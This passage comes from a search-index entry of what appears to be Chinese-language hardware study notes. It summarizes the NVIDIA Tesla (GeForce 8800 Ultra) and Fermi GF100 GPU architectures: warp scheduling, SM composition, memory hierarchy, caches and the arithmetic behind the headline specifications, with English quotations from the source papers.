\u200b\u7684\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u7684\u200b\u5355\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u5cf0\u503c\u200b\u6027\u80fd\u200b\u662f\u200b 36 GFLOPS\u3002\u200b\u8fd9\u4e2a\u200b 36 GFLOPS \u200b\u5305\u62ec\u200b\u4e86\u200b SP \u200b\u5185\u200b\u7684\u200b MAD \u200b\u5355\u5143\u200b\u7684\u200b \\(8 * 2 * 1.5 = 24\\) GFLOPS \u200b\u4ee5\u53ca\u200b SFU \u200b\u5185\u200b\u7684\u200b\u6d6e\u70b9\u200b\u52a0\u6cd5\u200b\u5355\u5143\u200b\u7684\u200b \\(2 * 4 * 1.5 = 12\\) GFLOPS\u3002\uff08<code>The GeForce 8800 Ultra clocks the SPs and SFU units at 1.5 GHz, for a peak of 36 Gflops per SM. To optimize power and area efficiency, some SM non-data-path units operate at half the SP clock rate.</code>\uff09</p> <p>SM \u200b\u4ee5\u200b warp \u200b\u4e3a\u200b\u5355\u4f4d\u200b\u6765\u200b\u5e76\u884c\u6267\u884c\u200b\u591a\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u4e00\u4e2a\u200b warp \u200b\u6709\u200b 32 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u6267\u884c\u200b 768 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 24 \u200b\u4e2a\u200b warp\u3002SM \u200b\u5728\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u51c6\u5907\u200b\u597d\u200b\u6267\u884c\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b warp \u200b\u53bb\u200b\u53d1\u5c04\u200b\u6307\u4ee4\u200b\u3002\u200b\u5f53\u200b warp \u200b\u5206\u53c9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5148\u200b\u5b8c\u6210\u200b\u5206\u652f\u200b\u4e00\u4e2a\u200b\u65b9\u5411\u200b\u7684\u200b\u6267\u884c\u200b\uff0c\u200b\u518d\u200b\u5b8c\u6210\u200b\u5206\u652f\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u65b9\u5411\u200b\uff0c\u200b\u76f4\u5230\u200b\u4e24\u8fb9\u200b\u91cd\u65b0\u200b\u6c47\u805a\u200b\u5230\u200b\u540c\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6574\u4e2a\u200b warp \u200b\u53c8\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u3002</p> <p>\u200b\u8d1f\u8d23\u200b warp \u200b\u8c03\u5ea6\u200b\u7684\u200b\u5c31\u662f\u200b SM warp scheduler\u3002\u200b\u5b83\u200b\u8fd0\u884c\u200b\u5728\u200b 1.5GHz \u200b\u7684\u200b\u4e00\u534a\u200b\u9891\u7387\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 750MHz\u3002\u200b\u5b83\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u4f1a\u200b\u4ece\u200b 24 \u200b\u4e2a\u200b warp \u200b\u4e2d\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u53bb\u200b\u8c03\u5ea6\u200b\uff08<code>The SM warp scheduler operates at half the 1.5-GHz processor clock rate. At each cycle, it selects one of the 24 warps to execute a SIMT warp instruction</code>\uff09\uff0c\u200b\u88ab\u200b\u8c03\u5ea6\u200b\u7684\u200b warp \u200b\u7684\u200b 32 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u4f1a\u200b\u88ab\u200b\u62c6\u6210\u200b\u4e24\u7ec4\u200b\uff0c\u200b\u6bcf\u7ec4\u200b 16 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b\u56db\u4e2a\u200b 1.5GHz \u200b\u9891\u7387\u200b\u7684\u200b\u5468\u671f\u200b\u53bb\u200b\u6267\u884c\u200b\uff1a\u200b\u56e0\u4e3a\u200b SP \u200b\u53ea\u6709\u200b 8 \u200b\u4e2a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6700\u200b\u591a\u200b\u8fdb\u884c\u200b 8 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u7684\u200b\u6267\u884c\u200b\uff0c32 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u7684\u8bdd\u200b\u5c31\u200b\u9700\u8981\u200b 4 \u200b\u4e2a\u200b\u5468\u671f\u200b\uff08<code>An issued warp instruction executes as two sets of 16 threads over four processor cycles.</code>\uff09\u3002\u200b\u5728\u200b\u5b9e\u73b0\u200b warp \u200b\u8c03\u5ea6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cwarp scheduler \u200b\u91c7\u7528\u200b\u4e86\u200b scoreboard \u200b\u673a\u5236\u200b\uff0c\u200b\u8ddf\u8e2a\u200b\u54ea\u4e9b\u200b warp \u200b\u53ef\u4ee5\u200b\u88ab\u200b issue\u3002\u200b\u8c03\u5ea6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u53ef\u4ee5\u200b\u88ab\u200b issue \u200b\u7684\u200b warp \u200b\u91cc\u9762\u200b\uff0c\u200b\u6839\u636e\u200b\u4f18\u5148\u7ea7\u200b\u3001\u200b\u6307\u4ee4\u200b\u7c7b\u578b\u200b\u548c\u200b\u516c\u5e73\u6027\u200b\u7b49\u200b\u539f\u5219\u200b\u53bb\u200b\u8c03\u5ea6\u200b warp\u3002</p> <p>\u200b\u6bcf\u4e2a\u200b SP \u200b\u4e0a\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u652f\u6301\u200b\uff1a\u200b\u6d6e\u70b9\u200b\uff0c\u200b\u6574\u6570\u200b\uff0c\u200b\u4f4d\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u7c7b\u578b\u8f6c\u6362\u200b\uff0c\u200b\u7279\u6b8a\u200b\u51fd\u6570\u200b\uff0c\u200b\u63a7\u5236\u6d41\u200b\uff0c\u200b\u5185\u5b58\u200b\u8bfb\u5199\u200b\u548c\u200b Texture\u3002\u200b\u73b0\u5728\u200b\u627e\u200b\u4e0d\u5230\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b\u6307\u4ee4\u96c6\u200b\u5217\u8868\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b Fermi Instruction Set \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b Tesla \u200b\u7684\u200b\u4e0b\u4e00\u4ee3\u200b\u67b6\u6784\u200b Fermi \u200b\u7684\u200b\u6307\u4ee4\u96c6\u200b\u5217\u8868\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u5e26\u5bbd\u200b\uff0cSM \u200b\u4f1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b warp \u200b\u5bf9\u200b local \u200b\u6216\u8005\u200b global memory \u200b\u7684\u200b\u8bbf\u95ee\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u628a\u200b\u8fde\u7eed\u200b\u7684\u200b\u8bbf\u95ee\u200b\u5408\u5e76\u200b\u6210\u200b\u4e00\u4e2a\u200b\u5927\u200b\u7684\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u4ece\u800c\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u3002Tesla \u200b\u67b6\u6784\u200b\u8fd8\u200b\u5f15\u5165\u200b\u4e86\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5305\u62ec\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u3001\u200b\u6574\u6570\u200b\u6700\u5c0f\u200b\u6700\u5927\u503c\u200b\u3001\u200b\u903b\u8f91\u8fd0\u7b97\u200b\u3001swap \u200b\u548c\u200b Compare-And-Swap\uff08CAS\uff09\u3002\u200b\u5173\u4e8e\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b \u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b \u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>\u200b\u5185\u5b58\u200b\u90e8\u5206\u200b\uff0cTesla \u200b\u67b6\u6784\u200b\u7684\u200b DRAM \u200b\u5bbd\u5ea6\u200b\u662f\u200b 384 \u200b\u4f4d\u200b\uff0c\u200b\u5206\u4e3a\u200b 6 \u200b\u7ec4\u200b\uff0c\u200b\u6bcf\u7ec4\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u4e5f\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u516d\u5206\u4e4b\u4e00\u200b\u7684\u200b\u663e\u5b58\u200b\u5bb9\u91cf\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u7269\u7406\u5730\u5740\u200b\u7a7a\u95f4\u200b\u3002Tesla \u200b\u67b6\u6784\u200b\u5df2\u7ecf\u200b\u5f15\u5165\u200b\u4e86\u200b\u865a\u62df\u5185\u5b58\u200b\uff0c\u200b\u6240\u6709\u200b\u6307\u4ee4\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u5730\u5740\u200b\u90fd\u200b\u662f\u200b\u865a\u62df\u5730\u5740\u200b\u3002\u200b\u9875\u8868\u200b\u4fdd\u5b58\u200b\u5728\u200b local memory \u200b\u91cc\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u6709\u200b\u76f8\u5e94\u200b\u7684\u200b TLB \u200b\u5c42\u6b21\u200b\u6765\u200b\u51cf\u5c11\u200b page table walk \u200b\u7684\u200b\u6b21\u6570\u200b\u3002Tesla \u200b\u67b6\u6784\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6309\u7167\u200b\u4f20\u7edf\u200b\u7684\u200b\u56fe\u5f62\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u7eb9\u7406\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e00\u7cfb\u5217\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u7136\u540e\u200b\u5199\u5165\u200b\u7ed3\u679c\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002\u200b\u56e0\u6b64\u200b Tesla \u200b\u67b6\u6784\u200b\u53ea\u200b\u9488\u5bf9\u200b\u7eb9\u7406\u200b\u8bfb\u53d6\u200b\u8bbe\u7f6e\u200b\u4e86\u200b L1 \u200b\u548c\u200b L2 \u200b\u7f13\u5b58\u200b\u3002</p> <p>CUDA \u200b\u4e2d\u200b\uff0c\u200b\u6709\u200b thread block \u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b cooperative thread array\uff08CTA\uff09\uff0ccooperative \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u8fd9\u4e9b\u200b thread \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b shared memory \u200b\u548c\u200b __syncthreads \u200b\u6765\u200b\u534f\u540c\u200b\u5b8c\u6210\u200b\u4e00\u4e9b\u200b\u8ba1\u7b97\u200b\u3002\u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b shared memory\uff0c\u200b\u81ea\u7136\u200b CTA \u200b\u4f1a\u200b\u88ab\u200b\u5f52\u200b\u5230\u200b\u67d0\u4e2a\u200b SM \u200b\u4e0b\u9762\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u8de8\u8d8a\u200b\u591a\u4e2a\u200b SM \u200b\u53bb\u200b\u6267\u884c\u200b\u3002\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u652f\u6301\u200b\u6700\u200b\u591a\u200b\u540c\u65f6\u200b\u6267\u884c\u200b 8 \u200b\u4e2a\u200b CTA\u3002</p> <p>CUDA \u200b\u4e2d\u7ebf\u200b\u7a0b\u200b\u4e00\u5171\u200b\u6709\u200b\u4e09\u4e2a\u200b\u5c42\u6b21\u200b\uff1a\u200b\u7b2c\u4e00\u4e2a\u200b\u662f\u200b Grid\uff0c\u200b\u7b2c\u4e8c\u4e2a\u200b\u662f\u200b Block\uff08Thread Block\uff0cCooperative Thread Array\uff09\uff0c\u200b\u7b2c\u4e09\u4e2a\u200b\u662f\u200b Thread\u3002Thread \u200b\u72ec\u4eab\u200b\u81ea\u5df1\u200b\u7684\u200b local memory\uff0cBlock \u200b\u5185\u200b\u7684\u200b\u6240\u6709\u200b Thread \u200b\u5171\u4eab\u200b Shared memory\uff0cGrid \u200b\u5185\u200b\u7684\u200b\u6240\u6709\u200b Thread \u200b\u5171\u4eab\u200b Global memory\u3002\u200b\u8fd9\u6837\u200b\u4e09\u4e2a\u200b\u7ebf\u7a0b\u200b\u5c42\u6b21\u200b\u5c31\u200b\u548c\u200b\u4e09\u79cd\u200b\u7c7b\u578b\u200b\u7684\u200b\u5185\u5b58\u200b\u5bf9\u5e94\u200b\u4e0a\u200b\u4e86\u200b\u3002Local memory \u200b\u867d\u7136\u200b\u662f\u200b\u7ebf\u7a0b\u200b\u5c40\u90e8\u200b\u7684\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\u4e5f\u200b\u662f\u200b\u4fdd\u5b58\u200b\u5728\u200b\u663e\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5176\u4ed6\u200b\u7ebf\u7a0b\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u7528\u6765\u200b\u4fdd\u5b58\u200b\u6808\u200b\u548c\u200b\u4e34\u65f6\u200b\u53d8\u91cf\u200b\u3002\u200b\u53ea\u6709\u200b Shared memory \u200b\u662f\u200b\u653e\u5728\u200b SM \u200b\u5185\u90e8\u200b\u7684\u200b\uff0c\u200b\u4f9b\u200b\u540c\u4e00\u4e2a\u200b CTA \u200b\u5185\u200b\u7684\u200b\u7ebf\u7a0b\u200b\u5171\u4eab\u200b\u3002</p> <p>\u200b\u6700\u540e\u200b\uff0c\u200b\u8bba\u6587\u200b\u603b\u7ed3\u200b\u4e86\u200b\u91c7\u7528\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b GeForce 8800 Ultra GPU \u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li>681 million transistors, 470 mm^2;</li> <li>TSMC 90-nm CMOS;</li> <li>128 SP cores in 16 SMs; \u200b\u6bcf\u4e2a\u200b SM \u200b\u5185\u6709\u200b 8 \u200b\u4e2a\u200b SP\uff0c\u200b\u6240\u4ee5\u200b \\(8 * 16 = 128\\)</li> <li>12,288 processor threads; \u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8c03\u5ea6\u200b 24 \u200b\u4e2a\u200b warp\uff0c\u200b\u6240\u4ee5\u200b \\(16 * 24 * 32 = 12288\\)</li> <li>1.5-GHz processor clock rate;</li> <li>peak 576 Gflops in processors; \u200b\u6bcf\u4e2a\u200b SM \u200b\u662f\u200b 36 Gflops\uff0c\u200b\u6240\u4ee5\u200b \\(36 * 16 = 576\\)</li> <li>768-Mbyte GDDR3 DRAM; \u200b\u6bcf\u4e2a\u200b GDDR3 channel \u200b\u5185\u5b58\u200b\u6709\u200b 128MB\uff0c\u200b\u4e00\u5171\u200b 6 \u200b\u4e2a\u200b channel\uff0c\u200b\u6240\u4ee5\u200b \\(128 * 6 = 768\\)</li> <li>384-pin DRAM interface; \u200b\u6bcf\u4e2a\u200b GDDR3 channel \u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u6240\u4ee5\u200b \\(64 * 6 = 384\\)</li> <li>1.08-GHz DRAM clock;</li> <li>104-Gbyte/s peak bandwidth; \u200b\u6bcf\u4e2a\u200b GDDR3 channel \u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u6240\u4ee5\u200b \\(1.08 * 64 / 8 * 2 * 6 = 103.68\\)</li> <li>typical power of 150W at 1.3V.</li> </ul> <p>\u200b\u5728\u200b G80 \u200b\u4e4b\u540e\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b\u82af\u7247\u200b\uff1aGT200\uff0c\u200b\u91c7\u7528\u200b\u4e86\u200b Tesla 2.0 \u200b\u67b6\u6784\u200b\uff0c65nm \u200b\u5236\u7a0b\u200b\u5de5\u827a\u200b\u3002Tesla 2.0 \u200b\u76f8\u6bd4\u200b Tesla 1.0\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-fermi","title":"NVIDIA Fermi","text":"<p>\u200b\u8bba\u6587\u200b\uff1aC. M. Wittenbrink, E. Kilgariff and A. Prabhu, \"Fermi GF100 GPU Architecture,\" in IEEE Micro, vol. 31, no. 2, pp. 50-59, March-April 2011, doi: 10.1109/MM.2011.24.</p> <p>PPT: C.M. Wittenbrink, E. Kilgariff, and A. Prabhu, \u2018\u2018Fermi GF100: A Graphics Processing Unit (GPU) Architecture for Compute Tessellation, Physics, and Computational Graphics,\u2019\u2019 IEEE Hot Chips, presentation, 2010; https://old.hotchips.org/wp-content/uploads/hc_archives/hc22/HC22.23.110-1-Wittenbrink-Fermi-GF100.pdf.</p> <p>Whitepaper: Fermi: NVIDIA\u2019s Next Generation CUDA Compute Architecture</p> <p>Whitepaper: NVIDIA\u2019s Fermi: The First Complete GPU Computing Architecture</p> <p>Fermi \u200b\u662f\u200b Tesla \u200b\u7684\u200b\u4e0b\u4e00\u4ee3\u200b NVIDIA \u200b\u663e\u5361\u200b\u67b6\u6784\u200b\u3002Tesla \u200b\u867d\u7136\u200b\u652f\u6301\u200b\u4e86\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4f46\u200b\u4f9d\u7136\u200b\u4fdd\u7559\u200b\u4e86\u200b\u5f88\u591a\u200b\u56fe\u5f62\u200b\u8ba1\u7b97\u200b\u7684\u200b\u9057\u7559\u200b\u8bbe\u8ba1\u200b\u3002\u200b\u76f8\u6bd4\u4e4b\u4e0b\u200b\uff0cFermi \u200b\u9488\u5bf9\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\u505a\u51fa\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6539\u53d8\u200b\uff1a\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3001\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u8bbf\u5b58\u200b\u5355\u5143\u200b\u3001\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u3001ECC \u200b\u5185\u5b58\u200b\u4ee5\u53ca\u200b\u66f4\u5feb\u200b\u7684\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u3002\u200b\u901a\u8fc7\u200b\u5f15\u5165\u200b Unified Address Space\uff0cFermi \u200b\u67b6\u6784\u200b\u80fd\u591f\u200b\u652f\u6301\u200b\u66f4\u200b\u591a\u200b\u4f7f\u7528\u200b\u6307\u9488\u200b\u7684\u200b C++ \u200b\u7a0b\u5e8f\u200b\u3002</p> <p>GF100 \u200b\u662f\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b\u4e00\u6b3e\u200b\u6838\u5fc3\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>16 SM, 32 CUDA cores/SM, 512 CUDA cores in total</li> <li>3 billion transistors, 40nm TSMC process</li> <li>6Gbytes GDDR5 memory</li> <li>384-bit memory interface, 6 channels</li> <li>16 PolyMorph engines</li> <li>4 raster units</li> <li>64 texture units</li> <li>48 ROP(raster operation processor) units</li> </ul> <p>\u200b\u4ece\u200b\u5fae\u200b\u67b6\u6784\u200b\u65b9\u9762\u200b\uff0cFermi \u200b\u67b6\u6784\u200b\u628a\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b TPC \u200b\u6539\u540d\u200b\u4e3a\u200b Graphics Processor Clusters\uff08GPC\uff09\uff0c\u200b\u6bd5\u7adf\u200b Texture \u200b\u73b0\u5728\u200b\u663e\u5f97\u200b\u4e0d\u518d\u200b\u90a3\u4e48\u200b\u91cd\u8981\u200b\u3002GT100 \u200b\u6709\u200b 4 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 4 \u200b\u4e2a\u200b SM\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u5171\u200b\u662f\u200b 16 \u200b\u4e2a\u200b SM\u3002SM \u200b\u4e2a\u6570\u200b\u76f8\u6bd4\u200b Tesla \u200b\u67b6\u6784\u200b\u6ca1\u6709\u200b\u53d8\u5316\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b 8 TPC \u200b\u4e58\u4ee5\u200b 2 SM/TPC \u200b\u53d8\u6210\u200b\u4e86\u200b 4 GPC \u200b\u4e58\u4ee5\u200b 4 SM/GPC\u3002\u200b\u5185\u5b58\u200b\u4f9d\u7136\u200b\u662f\u200b 6 \u200b\u901a\u9053\u200b\u3002\u200b\u65b0\u589e\u200b\u4e86\u200b\u4e00\u4e2a\u200b GigaThread engine\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u5185\u6709\u200b\u4e00\u4e2a\u200b PolyMorph engine \u200b\u548c\u200b rasterizer\uff08Tesla \u200b\u67b6\u6784\u200b\u6574\u4e2a\u200b GPU \u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b rasterizer\uff09\u3002\u200b\u67b6\u6784\u56fe\u200b\u89c1\u200b\u4e0b\u200b\uff1a</p> <p> </p> Fermi \u200b\u67b6\u6784\u200b\u603b\u89c8\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aFermi GF100 GPU Architecture Figure 2\uff09 <p>Fermi \u200b\u67b6\u6784\u200b\u5728\u200b SM \u200b\u5185\u90e8\u200b\u76f8\u6bd4\u200b Tesla \u200b\u53d8\u5316\u200b\u6bd4\u8f83\u200b\u5927\u200b\uff1aTesla \u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b 8 \u200b\u4e2a\u200b SP\uff0c\u200b\u800c\u200b Fermi \u200b\u6bcf\u4e2a\u200b SM \u200b\u91cc\u9762\u200b\u6709\u200b 32 \u200b\u4e2a\u200b CUDA core\uff0cCUDA core \u200b\u7ea6\u7b49\u4e8e\u200b Tesla \u200b\u7684\u200b SP\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u662f\u200b\u56db\u500d\u200b\u7684\u200b\u5173\u7cfb\u200b\u3002\u200b\u867d\u7136\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u6570\u91cf\u200b\u548c\u200b Tesla \u200b\u76f8\u540c\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b 16\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b CUDA core \u200b\u7684\u200b\u6570\u91cf\u200b\u4e0a\u200b\u770b\u200b\uff0c\u200b\u4ece\u200b \\(16 * 8 = 128\\) \u200b\u63d0\u5347\u200b\u5230\u200b\u4e86\u200b \\(16 * 32 = 512\\) \u200b\u4e2a\u200b\u3002SFU \u200b\u5355\u5143\u200b\u4e5f\u200b\u4ece\u200b Tesla \u200b\u7684\u200b\u6bcf\u4e2a\u200b SM \u200b\u4e24\u4e2a\u200b\uff0c\u200b\u63d0\u5347\u200b\u5230\u200b\u4e86\u200b\u6bcf\u4e2a\u200b SM \u200b\u56db\u4e2a\u200b\u3002Fermi \u200b\u7684\u200b CUDA core \u200b\u5b9e\u73b0\u200b\u4e86\u200b\u6d6e\u70b9\u200b\u4e58\u52a0\u200b\u878d\u5408\u200b\uff08FMA\uff09\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b 16 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u4e58\u52a0\u200b\u64cd\u4f5c\u200b\u3002Tesla \u200b\u7684\u200b\u6d6e\u70b9\u200b\u5e76\u200b\u6ca1\u6709\u200b\u5b8c\u5168\u200b\u6309\u7167\u200b IEEE754 \u200b\u6807\u51c6\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0d\u200b\u652f\u6301\u200b subnormal \u200b\u6d6e\u70b9\u200b\uff0c\u200b\u800c\u200b Fermi \u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5b8c\u6574\u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5b9e\u73b0\u200b\u4e86\u200b IEEE754 \u200b\u6807\u51c6\u200b\u7684\u200b rounding mode\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cFermi \u200b\u67b6\u6784\u200b\u8fd8\u200b\u628a\u200b Load/Store\uff08LD/ST\uff09\u200b\u5355\u5143\u200b\u72ec\u7acb\u200b\u51fa\u6765\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 16 \u200b\u4e2a\u200b LD/ST \u200b\u5355\u5143\u200b\uff0c\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u4e5f\u200b\u4ece\u200b 32 \u200b\u4f4d\u200b\u6269\u5927\u200b\u5230\u200b\u4e86\u200b 64 \u200b\u4f4d\u200b\u3002\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u4fdd\u5b58\u200b\u4e86\u200b 32768 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u3002</p> <p>Tesla \u200b\u67b6\u6784\u200b\u6709\u200b\u56fe\u5f62\u5904\u7406\u200b\u7684\u200b\u60ef\u6027\u200b\uff0c\u200b\u53ea\u200b\u8003\u8651\u200b\u4e86\u200b\u56fe\u5f62\u5904\u7406\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6ca1\u6709\u200b\u8bbe\u7f6e\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\uff0c\u200b\u8ba4\u4e3a\u200b\u7a0b\u5e8f\u200b\u53ea\u4f1a\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u7eb9\u7406\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ea\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u7eb9\u7406\u200b\u7684\u200b L1 \u200b\u548c\u200b L2 \u200b\u7f13\u5b58\u200b\u3002\u200b\u4f46\u662f\u200b\u7f3a\u5c11\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u5bf9\u4e8e\u200b\u57fa\u4e8e\u200b CUDA \u200b\u7684\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\u7a0b\u5e8f\u200b\u662f\u200b\u81f4\u547d\u200b\u7684\u200b\u3002Fermi \u200b\u67b6\u6784\u200b\u5f15\u5165\u200b\u4e86\u200b L1 \u200b\u548c\u200b L2 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3002Fermi \u200b\u67b6\u6784\u200b\u7684\u200b Shared Memory \u200b\u548c\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u5927\u5c0f\u200b\u662f\u200b\u53ef\u200b\u914d\u7f6e\u200b\u7684\u200b\uff0c\u200b\u4e8c\u8005\u200b\u5171\u4eab\u200b 64 KB \u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b 48KB Shared Memory \u200b\u52a0\u200b 16KB \u200b\u7684\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b 16KB Shared Memory \u200b\u548c\u200b 48KB \u200b\u7684\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3002Fermi \u200b\u67b6\u6784\u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u5199\u200b\u56de\u200b\uff08write-back\uff09\u200b\u7b56\u7565\u200b\u3002</p> <p> </p> Fermi \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aFermi GF100 GPU Architecture Figure 3\uff09 <p> </p> Fermi \u200b\u67b6\u6784\u200b SM \u200b\u53d1\u5c04\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA\u2019s Fermi: The First Complete GPU Computing Architecture Figure 7\uff09 